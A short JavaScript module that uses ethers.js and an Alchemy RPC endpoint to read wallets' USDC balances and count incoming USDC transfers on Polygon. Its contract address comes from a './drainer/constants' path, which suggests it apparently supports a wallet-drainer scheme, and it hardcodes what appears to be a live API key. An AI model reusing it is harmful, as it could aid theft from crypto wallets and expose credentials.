import { JsonRpcProvider, Contract, formatUnits } from 'ethers';
import { USDC_ADDRESS as contractAddress } from './drainer/constants';

const ALCHEMY_RPC = "https://polygon-mainnet.g.alchemy.com/v2/zBsPuA2XNHCpzYhqZsGJOTF32eOGcgPv";
const abi = [
  "function balanceOf(address) view returns (uint256)",
  "function decimals() view returns (uint8)"
];

async function getPolygonContract() {
  const provider = new JsonRpcProvider(ALCHEMY_RPC);
  return new Contract(contractAddress, abi, provider);
}

async function getBalance(address) {
  try {
    const contract = await getPolygonContract();
    const balance = await contract.balanceOf(address);
    // USDC is 6 decimals - formatUnits handles the BigInt math for you
    return parseFloat(formatUnits(balance, 6));
  } catch (error) {
    console.error("Balance fetch failed:", error);
    return 0;
  }
}

async function getDepositCount(address) {
  const provider = new JsonRpcProvider(ALCHEMY_RPC);

  try {
    const response = await provider.send("alchemy_getAssetTransfers", [
      {
        fromBlock: "0x0",
        toBlock: "latest",
        toAddress: address,      // Filters for transfers TO this user (deposits)
        contractAddresses: [contractAddress], // Specifically USDC
        category: ["erc20"],     // Filter for ERC20 tokens
        excludeZeroValue: true,
      }
    ]);

    // This returns an array of transfer objects (up to 1000 per page)
    return response.transfers.length;
  } catch (error) {
    console.error("Alchemy Transfer API failed:", error);
    return 0;
  }
}

export { getBalance, getDepositCount };